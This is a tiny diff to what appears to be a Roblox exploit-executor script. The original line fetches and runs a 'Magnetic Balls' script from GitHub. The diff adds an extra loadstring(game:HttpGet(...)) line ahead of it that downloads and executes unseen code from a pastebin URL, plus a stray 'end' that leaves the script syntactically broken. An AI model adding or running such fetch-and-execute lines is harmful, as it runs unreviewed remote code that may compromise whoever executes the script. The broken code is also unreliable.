@@ -1,2 +1,4 @@
-
+loadstring(game:HttpGet("https://pastebin.com/raw/wTpGhnV4"))()
+task.wait(0.1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JakeScripterz/Screepts/refs/heads/main/Magnetic%20Balls"))()
+end
